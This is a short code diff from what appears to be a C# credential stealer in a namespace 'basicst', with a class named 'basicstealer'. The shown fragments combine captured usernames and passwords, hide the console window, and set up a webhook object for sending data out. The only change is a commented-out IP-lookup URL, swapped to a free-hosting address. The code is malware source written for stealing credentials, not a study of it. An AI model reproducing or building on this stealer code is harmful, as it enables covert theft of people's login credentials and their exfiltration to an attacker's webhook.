@@ -86,7 +86,7 @@ namespace basicst
             {
                 previus = username + password;
                 WebClient webClient = new WebClient();
-            //string ip = webClient.DownloadString(""http://ipv4bot.whatismyipaddress.com/"");
+            //string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
             using (basicstealer webhook = new basicstealer())
             {
                 webhook.WebHook = ""#webhook"";
@@ -209,7 +209,7 @@ namespace basicst
                 Program.ShowWindow(consoleWindow, 0);
             }
             WebClient webClient = new WebClient();
-            //string ip = webClient.DownloadString(""http://ipv4bot.whatismyipaddress.com/"");
+            //string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
             using (basicstealer webhook = new basicstealer())
             {
                 webhook.WebHook = ""#webhook"";
